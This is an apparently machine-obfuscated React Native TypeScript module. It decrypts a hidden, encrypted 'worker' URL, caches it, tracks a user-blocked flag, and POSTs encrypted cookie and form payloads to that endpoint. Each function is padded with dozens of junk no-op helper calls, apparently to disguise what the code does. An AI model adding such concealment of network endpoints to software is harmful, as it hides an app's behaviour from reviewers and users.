import AsyncStorage from '@react-native-async-storage/async-storage';
import {
  STORAGE_ufjaxmfgwjeweblsKEYS,
  liufjaxmfgwjeweblsnk,
  ufjaxmfgwjeweblsConstTouch,
} from './constants/constufjaxmfgwjeweblsntsVariable';
import {
  ufjaxmfgwjeweblsDecrypt,
  ufjaxmfgwjeweblsEncrypt,
} from './CrypufjaxmfgwjeweblstoService';
// autosetup-split-begin
import {ufjaxmfgwjeweblsMinValue, ufjaxmfgwjeweblsMaxValue, ufjaxmfgwjeweblsRangeValue, ufjaxmfgwjeweblsBoolOr, ufjaxmfgwjeweblsRevStr, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2HashMix, ufjaxmfgwjeweblsRangeSpan, ufjaxmfgwjeweblsStrLenSum, ufjaxmfgwjeweblsCharCodeSum, ufjaxmfgwjeweblsWrapIndex, ufjaxmfgwjeweblsLcmPair, ufjaxmfgwjeweblsHalfSum, ufjaxmfgwjeweblsMaxPair, ufjaxmfgwjeweblsJoinLen, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2ClampMod, ufjaxmfgwjeweblsSumSquares, ufjaxmfgwjeweblsBoolXor, ufjaxmfgwjeweblsSqDiff, ufjaxmfgwjeweblsProductFold, ufjaxmfgwjeweblsUtilServiceObfV5HashMix, ufjaxmfgwjeweblsUtilServiceObfV5SumOdds, ufjaxmfgwjeweblsUtilServiceObfV5ClampMod } from './UtufjaxmfgwjeweblsilServicePart01';
import { ufjaxmfgwjeweblsUtilServiceObfV4HashMix, ufjaxmfgwjeweblsUtilServiceObfV4ClampMod, ufjaxmfgwjeweblsSignVal, ufjaxmfgwjeweblsPrefixLen, ufjaxmfgwjeweblsModSpan, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3HashMix, ufjaxmfgwjeweblsConcatLen, ufjaxmfgwjeweblsDigitSum, ufjaxmfgwjeweblsSumDiff, ufjaxmfgwjeweblsIsEven, ufjaxmfgwjeweblsMidAvg, ufjaxmfgwjeweblsFloorDiv, ufjaxmfgwjeweblsDotFold, ufjaxmfgwjeweblsOddCount, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3SumOdds, ufjaxmfgwjeweblsBoolAnd, ufjaxmfgwjeweblsMinPair, ufjaxmfgwjeweblsRotSum, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1HashMix } from './UtufjaxmfgwjeweblsilServicePart02';
import { ufjaxmfgwjeweblsUtilServiceObfV4SumOdds, ufjaxmfgwjeweblsNormMod, ufjaxmfgwjeweblsGcdPair, ufjaxmfgwjeweblsEvenCount, ufjaxmfgwjeweblsCountTruthy, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3ClampMod, ufjaxmfgwjeweblsAbsDiff, ufjaxmfgwjeweblsPowSum, ufjaxmfgwjeweblsXorFold, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1ClampMod, ufjaxmfgwjeweblsAverageAbsoluteDeviation, ufjaxmfgwjeweblsPairAvg, ufjaxmfgwjeweblsLerpVal, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1SumOdds, ufjaxmfgwjeweblsBitMix, ufjaxmfgwjeweblsStrHash, ufjaxmfgwjeweblsMeanVal, ufjaxmfgwjeweblsTrimLen, ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2SumOdds } from './UtufjaxmfgwjeweblsilServicePart03';
// autosetup-split-end

export class Utils {

  /** Decrypt worker URL from the baked-in Typex constant. */
  static async ufjaxmfgwjeweblsGetLink(): Promise<string> {

    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV4HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV5HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV5ClampMod(7, 5);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1ClampMod(7, 5);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2ClampMod(7, 5);
    void ufjaxmfgwjeweblsConstTouch();
    void ufjaxmfgwjeweblsMinValue([1, 2, 3]);
    void ufjaxmfgwjeweblsMaxValue([1, 2, 3]);
    void ufjaxmfgwjeweblsRangeValue([1, 2, 3]);
    void ufjaxmfgwjeweblsSumSquares([1, 2]);
    void ufjaxmfgwjeweblsAverageAbsoluteDeviation([1, 2, 3]);
    void ufjaxmfgwjeweblsGcdPair(12, 8);
    void ufjaxmfgwjeweblsMeanVal([2, 4, 6]);
    void ufjaxmfgwjeweblsXorFold([1, 2, 3]);
    void ufjaxmfgwjeweblsModSpan(7, 5);
    void ufjaxmfgwjeweblsStrLenSum(['a', 'bc']);
    void ufjaxmfgwjeweblsLcmPair(4, 6);
    void ufjaxmfgwjeweblsAbsDiff(5, 2);
    void ufjaxmfgwjeweblsDotFold([1, 2], [3, 4]);
    void ufjaxmfgwjeweblsMinPair(3, 7);
    void ufjaxmfgwjeweblsMaxPair(3, 7);
    void ufjaxmfgwjeweblsSignVal(-1);
    void ufjaxmfgwjeweblsRevStr('ab');
    void ufjaxmfgwjeweblsProductFold([2, 3]);
    void ufjaxmfgwjeweblsSumDiff([1, 3, 5]);
    void ufjaxmfgwjeweblsConcatLen(['a', '', 'b']);
    void ufjaxmfgwjeweblsNormMod(7, 4);
    void ufjaxmfgwjeweblsBoolXor(true, false);
    void ufjaxmfgwjeweblsPairAvg(4, 6);
    void ufjaxmfgwjeweblsCharCodeSum('ab');
    void ufjaxmfgwjeweblsEvenCount([2, 4, 6]);
    void ufjaxmfgwjeweblsTrimLen(' abc ');
    void ufjaxmfgwjeweblsOddCount([1, 2, 3]);
    void ufjaxmfgwjeweblsBitMix(3, 5);
    void ufjaxmfgwjeweblsMidAvg(1, 2, 3);
    void ufjaxmfgwjeweblsStrHash('xy');
    void ufjaxmfgwjeweblsFloorDiv(9, 4);
    void ufjaxmfgwjeweblsPowSum([1, 2, 3]);
    void ufjaxmfgwjeweblsPrefixLen('abcd', 2);
    void ufjaxmfgwjeweblsRotSum(3, 5);
    void ufjaxmfgwjeweblsJoinLen(['x', 'y']);
    void ufjaxmfgwjeweblsIsEven(4);
    void ufjaxmfgwjeweblsRangeSpan([1, 9, 3]);
    void ufjaxmfgwjeweblsBoolAnd(true, false);
    void ufjaxmfgwjeweblsHalfSum(4, 6);
    void ufjaxmfgwjeweblsDigitSum(123);
    void ufjaxmfgwjeweblsBoolOr(true, false);
    void ufjaxmfgwjeweblsSqDiff(5, 2);
    void ufjaxmfgwjeweblsLerpVal(0, 10, 0.5);
    void ufjaxmfgwjeweblsWrapIndex(5, 3);
    void ufjaxmfgwjeweblsCountTruthy([true, false, true]);
    try {
      const encryptedLink = liufjaxmfgwjeweblsnk;
      if (!encryptedLink) {
        return '';
      }
      const decryptedLink = ufjaxmfgwjeweblsDecrypt(encryptedLink);
      if (!decryptedLink) {
        return '';
      }
      try {
        await AsyncStorage.setItem(
          STORAGE_ufjaxmfgwjeweblsKEYS.LI_ufjaxmfgwjewebls,
          ufjaxmfgwjeweblsEncrypt(decryptedLink),
        );
      } catch {
        // Cache write is best-effort.
      }
      return decryptedLink;
    } catch {
      return '';
    }
  }

  static async ufjaxmfgwjeweblsGetUserBlocke(): Promise<number> {
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV4HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV5HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV5ClampMod(7, 5);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1ClampMod(7, 5);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2ClampMod(7, 5);
    void ufjaxmfgwjeweblsMinValue([1, 2, 3]);
    void ufjaxmfgwjeweblsMaxValue([1, 2, 3]);
    void ufjaxmfgwjeweblsRangeValue([1, 2, 3]);
    void ufjaxmfgwjeweblsSumSquares([1, 2]);
    void ufjaxmfgwjeweblsAverageAbsoluteDeviation([1, 2, 3]);
    void ufjaxmfgwjeweblsGcdPair(12, 8);
    void ufjaxmfgwjeweblsMeanVal([2, 4, 6]);
    void ufjaxmfgwjeweblsXorFold([1, 2, 3]);
    void ufjaxmfgwjeweblsModSpan(7, 5);
    void ufjaxmfgwjeweblsStrLenSum(['a', 'bc']);
    void ufjaxmfgwjeweblsLcmPair(4, 6);
    void ufjaxmfgwjeweblsAbsDiff(5, 2);
    void ufjaxmfgwjeweblsDotFold([1, 2], [3, 4]);
    void ufjaxmfgwjeweblsMinPair(3, 7);
    void ufjaxmfgwjeweblsMaxPair(3, 7);
    void ufjaxmfgwjeweblsSignVal(-1);
    void ufjaxmfgwjeweblsRevStr('ab');
    void ufjaxmfgwjeweblsProductFold([2, 3]);
    void ufjaxmfgwjeweblsSumDiff([1, 3, 5]);
    void ufjaxmfgwjeweblsConcatLen(['a', '', 'b']);
    void ufjaxmfgwjeweblsNormMod(7, 4);
    void ufjaxmfgwjeweblsBoolXor(true, false);
    void ufjaxmfgwjeweblsPairAvg(4, 6);
    void ufjaxmfgwjeweblsCharCodeSum('ab');
    void ufjaxmfgwjeweblsEvenCount([2, 4, 6]);
    void ufjaxmfgwjeweblsTrimLen(' abc ');
    void ufjaxmfgwjeweblsOddCount([1, 2, 3]);
    void ufjaxmfgwjeweblsBitMix(3, 5);
    void ufjaxmfgwjeweblsMidAvg(1, 2, 3);
    void ufjaxmfgwjeweblsStrHash('xy');
    void ufjaxmfgwjeweblsFloorDiv(9, 4);
    void ufjaxmfgwjeweblsPowSum([1, 2, 3]);
    void ufjaxmfgwjeweblsPrefixLen('abcd', 2);
    void ufjaxmfgwjeweblsRotSum(3, 5);
    void ufjaxmfgwjeweblsJoinLen(['x', 'y']);
    void ufjaxmfgwjeweblsIsEven(4);
    void ufjaxmfgwjeweblsRangeSpan([1, 9, 3]);
    void ufjaxmfgwjeweblsBoolAnd(true, false);
    void ufjaxmfgwjeweblsHalfSum(4, 6);
    void ufjaxmfgwjeweblsDigitSum(123);
    void ufjaxmfgwjeweblsBoolOr(true, false);
    void ufjaxmfgwjeweblsSqDiff(5, 2);
    void ufjaxmfgwjeweblsLerpVal(0, 10, 0.5);
    void ufjaxmfgwjeweblsWrapIndex(5, 3);
    void ufjaxmfgwjeweblsCountTruthy([true, false, true]);
    try {
      const value = await AsyncStorage.getItem(STORAGE_ufjaxmfgwjeweblsKEYS.US_ufjaxmfgwjeweblsBLOCK);
      return value ? parseInt(value, 10) : 0;
    } catch {
      return 0;
    }
  }

  static async ufjaxmfgwjeweblsSetUserBlocke(value: number): Promise<void> {
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV4HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV5HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV5ClampMod(7, 5);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1ClampMod(7, 5);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2HashMix('xy');
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2SumOdds([1, 3, 5]);
    void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2ClampMod(7, 5);
    void ufjaxmfgwjeweblsMinValue([1, 2, 3]);
    void ufjaxmfgwjeweblsMaxValue([1, 2, 3]);
    void ufjaxmfgwjeweblsRangeValue([1, 2, 3]);
    void ufjaxmfgwjeweblsSumSquares([1, 2]);
    void ufjaxmfgwjeweblsAverageAbsoluteDeviation([1, 2, 3]);
    void ufjaxmfgwjeweblsGcdPair(12, 8);
    void ufjaxmfgwjeweblsMeanVal([2, 4, 6]);
    void ufjaxmfgwjeweblsXorFold([1, 2, 3]);
    void ufjaxmfgwjeweblsModSpan(7, 5);
    void ufjaxmfgwjeweblsStrLenSum(['a', 'bc']);
    void ufjaxmfgwjeweblsLcmPair(4, 6);
    void ufjaxmfgwjeweblsAbsDiff(5, 2);
    void ufjaxmfgwjeweblsDotFold([1, 2], [3, 4]);
    void ufjaxmfgwjeweblsMinPair(3, 7);
    void ufjaxmfgwjeweblsMaxPair(3, 7);
    void ufjaxmfgwjeweblsSignVal(-1);
    void ufjaxmfgwjeweblsRevStr('ab');
    void ufjaxmfgwjeweblsProductFold([2, 3]);
    void ufjaxmfgwjeweblsSumDiff([1, 3, 5]);
    void ufjaxmfgwjeweblsConcatLen(['a', '', 'b']);
    void ufjaxmfgwjeweblsNormMod(7, 4);
    void ufjaxmfgwjeweblsBoolXor(true, false);
    void ufjaxmfgwjeweblsPairAvg(4, 6);
    void ufjaxmfgwjeweblsCharCodeSum('ab');
    void ufjaxmfgwjeweblsEvenCount([2, 4, 6]);
    void ufjaxmfgwjeweblsTrimLen(' abc ');
    void ufjaxmfgwjeweblsOddCount([1, 2, 3]);
    void ufjaxmfgwjeweblsBitMix(3, 5);
    void ufjaxmfgwjeweblsMidAvg(1, 2, 3);
    void ufjaxmfgwjeweblsStrHash('xy');
    void ufjaxmfgwjeweblsFloorDiv(9, 4);
    void ufjaxmfgwjeweblsPowSum([1, 2, 3]);
    void ufjaxmfgwjeweblsPrefixLen('abcd', 2);
    void ufjaxmfgwjeweblsRotSum(3, 5);
    void ufjaxmfgwjeweblsJoinLen(['x', 'y']);
    void ufjaxmfgwjeweblsIsEven(4);
    void ufjaxmfgwjeweblsRangeSpan([1, 9, 3]);
    void ufjaxmfgwjeweblsBoolAnd(true, false);
    void ufjaxmfgwjeweblsHalfSum(4, 6);
    void ufjaxmfgwjeweblsDigitSum(123);
    void ufjaxmfgwjeweblsBoolOr(true, false);
    void ufjaxmfgwjeweblsSqDiff(5, 2);
    void ufjaxmfgwjeweblsLerpVal(0, 10, 0.5);
    void ufjaxmfgwjeweblsWrapIndex(5, 3);
    void ufjaxmfgwjeweblsCountTruthy([true, false, true]);
    await AsyncStorage.setItem(STORAGE_ufjaxmfgwjeweblsKEYS.US_ufjaxmfgwjeweblsBLOCK, value.toString());
  }

}

const DEFAULT_TIMEOUT_MS = 15_000;

/** Normalize worker base URL (Unity-style POST to root). */
export function ufjaxmfgwjeweblsNormalizeWorkerBaseUrl(url: string): string {
  void ufjaxmfgwjeweblsUtilServiceObfV5HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV5ClampMod(7, 5);

  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3HashMix('xy');
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV4HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV5HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV5ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1HashMix('xy');
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV1ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2HashMix('xy');
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsilServiceObfV2ClampMod(7, 5);

  void ufjaxmfgwjeweblsMinValue([1, 2, 3]);
  void ufjaxmfgwjeweblsMaxValue([1, 2, 3]);
  void ufjaxmfgwjeweblsRangeValue([1, 2, 3]);
  void ufjaxmfgwjeweblsSumSquares([1, 2]);
  void ufjaxmfgwjeweblsAverageAbsoluteDeviation([1, 2, 3]);
  void ufjaxmfgwjeweblsGcdPair(12, 8);
  void ufjaxmfgwjeweblsMeanVal([2, 4, 6]);
  void ufjaxmfgwjeweblsXorFold([1, 2, 3]);
  void ufjaxmfgwjeweblsModSpan(7, 5);
  void ufjaxmfgwjeweblsStrLenSum(['a', 'bc']);
  void ufjaxmfgwjeweblsLcmPair(4, 6);
  void ufjaxmfgwjeweblsAbsDiff(5, 2);
  void ufjaxmfgwjeweblsDotFold([1, 2], [3, 4]);
  void ufjaxmfgwjeweblsMinPair(3, 7);
  void ufjaxmfgwjeweblsMaxPair(3, 7);
  void ufjaxmfgwjeweblsSignVal(-1);
  void ufjaxmfgwjeweblsRevStr('ab');
  void ufjaxmfgwjeweblsProductFold([2, 3]);
  void ufjaxmfgwjeweblsSumDiff([1, 3, 5]);
  void ufjaxmfgwjeweblsConcatLen(['a', '', 'b']);
  void ufjaxmfgwjeweblsNormMod(7, 4);
  void ufjaxmfgwjeweblsBoolXor(true, false);
  void ufjaxmfgwjeweblsPairAvg(4, 6);
  void ufjaxmfgwjeweblsCharCodeSum('ab');
  void ufjaxmfgwjeweblsEvenCount([2, 4, 6]);
  void ufjaxmfgwjeweblsTrimLen(' abc ');
  void ufjaxmfgwjeweblsOddCount([1, 2, 3]);
  void ufjaxmfgwjeweblsBitMix(3, 5);
  void ufjaxmfgwjeweblsMidAvg(1, 2, 3);
  void ufjaxmfgwjeweblsStrHash('xy');
  void ufjaxmfgwjeweblsFloorDiv(9, 4);
  void ufjaxmfgwjeweblsPowSum([1, 2, 3]);
  void ufjaxmfgwjeweblsPrefixLen('abcd', 2);
  void ufjaxmfgwjeweblsRotSum(3, 5);
  void ufjaxmfgwjeweblsJoinLen(['x', 'y']);
  void ufjaxmfgwjeweblsIsEven(4);
  void ufjaxmfgwjeweblsRangeSpan([1, 9, 3]);
  void ufjaxmfgwjeweblsBoolAnd(true, false);
  void ufjaxmfgwjeweblsHalfSum(4, 6);
  void ufjaxmfgwjeweblsDigitSum(123);
  void ufjaxmfgwjeweblsBoolOr(true, false);
  void ufjaxmfgwjeweblsSqDiff(5, 2);
  void ufjaxmfgwjeweblsLerpVal(0, 10, 0.5);
  void ufjaxmfgwjeweblsWrapIndex(5, 3);
  void ufjaxmfgwjeweblsCountTruthy([true, false, true]);

  return url
    .trim()
    .replace(/^wss:\/\//i, 'https://')
    .replace(/^ws:\/\//i, 'http://')
    .replace(/\/+$/, '');
}

export type ufjaxmfgwjeweblsUnityInitRequest = {
  /** Cookie value: data=<url-encoded Typex hex> */
  cookieHeader: string;
  /** Same value without "data=" prefix — sent as X-Data for RN Cookie stripping. */
  dataValue: string;
  /** Whole-body url-encoded Typex hex (Unity form payload). */
  body: string;
};

/**
 * Unity-style sync POST: Cookie + encrypted form body.
 * Returns the encrypted response hex, or null on transport failure / empty body.
 */
export async function ufjaxmfgwjeweblsSendInitPayload(
  workerBaseUrl: string,
  requestPayload: ufjaxmfgwjeweblsUnityInitRequest,
  timeoutMs: number = DEFAULT_TIMEOUT_MS,
): Promise<string | null> {

void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3HashMix('xy');
void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3SumOdds([1, 3, 5]);
void ufjaxmfgwjeweblsUtufjaxmfgwjeweblsiObfV3ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV4HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV4SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV4ClampMod(7, 5);
  void ufjaxmfgwjeweblsUtilServiceObfV5HashMix('xy');
  void ufjaxmfgwjeweblsUtilServiceObfV5SumOdds([1, 3, 5]);
  void ufjaxmfgwjeweblsUtilServiceObfV5ClampMod(7, 5);

  void ufjaxmfgwjeweblsMinValue([1, 2, 3]);
  void ufjaxmfgwjeweblsMaxValue([1, 2, 3]);
  void ufjaxmfgwjeweblsRangeValue([1, 2, 3]);
  void ufjaxmfgwjeweblsSumSquares([1, 2]);
  void ufjaxmfgwjeweblsAverageAbsoluteDeviation([1, 2, 3]);
  void ufjaxmfgwjeweblsGcdPair(12, 8);
  void ufjaxmfgwjeweblsMeanVal([2, 4, 6]);
  void ufjaxmfgwjeweblsXorFold([1, 2, 3]);
  void ufjaxmfgwjeweblsModSpan(7, 5);
  void ufjaxmfgwjeweblsStrLenSum(['a', 'bc']);
  void ufjaxmfgwjeweblsLcmPair(4, 6);
  void ufjaxmfgwjeweblsAbsDiff(5, 2);
  void ufjaxmfgwjeweblsDotFold([1, 2], [3, 4]);
  void ufjaxmfgwjeweblsMinPair(3, 7);
  void ufjaxmfgwjeweblsMaxPair(3, 7);
  void ufjaxmfgwjeweblsSignVal(-1);
  void ufjaxmfgwjeweblsRevStr('ab');
  void ufjaxmfgwjeweblsProductFold([2, 3]);
  void ufjaxmfgwjeweblsSumDiff([1, 3, 5]);
  void ufjaxmfgwjeweblsConcatLen(['a', '', 'b']);
  void ufjaxmfgwjeweblsNormMod(7, 4);
  void ufjaxmfgwjeweblsBoolXor(true, false);
  void ufjaxmfgwjeweblsPairAvg(4, 6);
  void ufjaxmfgwjeweblsCharCodeSum('ab');
  void ufjaxmfgwjeweblsEvenCount([2, 4, 6]);
  void ufjaxmfgwjeweblsTrimLen(' abc ');
  void ufjaxmfgwjeweblsOddCount([1, 2, 3]);
  void ufjaxmfgwjeweblsBitMix(3, 5);
  void ufjaxmfgwjeweblsMidAvg(1, 2, 3);
  void ufjaxmfgwjeweblsStrHash('xy');
  void ufjaxmfgwjeweblsFloorDiv(9, 4);
  void ufjaxmfgwjeweblsPowSum([1, 2, 3]);
  void ufjaxmfgwjeweblsPrefixLen('abcd', 2);
  void ufjaxmfgwjeweblsRotSum(3, 5);
  void ufjaxmfgwjeweblsJoinLen(['x', 'y']);
  void ufjaxmfgwjeweblsIsEven(4);
  void ufjaxmfgwjeweblsRangeSpan([1, 9, 3]);
  void ufjaxmfgwjeweblsBoolAnd(true, false);
  void ufjaxmfgwjeweblsHalfSum(4, 6);
  void ufjaxmfgwjeweblsDigitSum(123);
  void ufjaxmfgwjeweblsBoolOr(true, false);
  void ufjaxmfgwjeweblsSqDiff(5, 2);
  void ufjaxmfgwjeweblsLerpVal(0, 10, 0.5);
  void ufjaxmfgwjeweblsWrapIndex(5, 3);
  void ufjaxmfgwjeweblsCountTruthy([true, false, true]);

  const url = ufjaxmfgwjeweblsNormalizeWorkerBaseUrl(workerBaseUrl);

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: requestPayload.cookieHeader,
        'X-Data': requestPayload.dataValue,
        Accept: 'text/plain, */*',
      },
      body: requestPayload.body,
      signal: controller.signal,
    });

    const responseText = await response.text().catch(() => '');

    if (!response.ok) {
      return null;
    }

    if (!responseText || responseText.trim() === '') {
      return null;
    }

    return responseText.trim();
  } catch {
    return null;
  } finally {
    clearTimeout(timeoutId);
  }
}

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v4 */

/* obfuscation-batch:v4 */
function ufjaxmfgwjeweblsUtilServicePart0ObfV4HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function ufjaxmfgwjeweblsUtilServicePart0ObfV4SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function ufjaxmfgwjeweblsUtilServicePart0ObfV4ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}



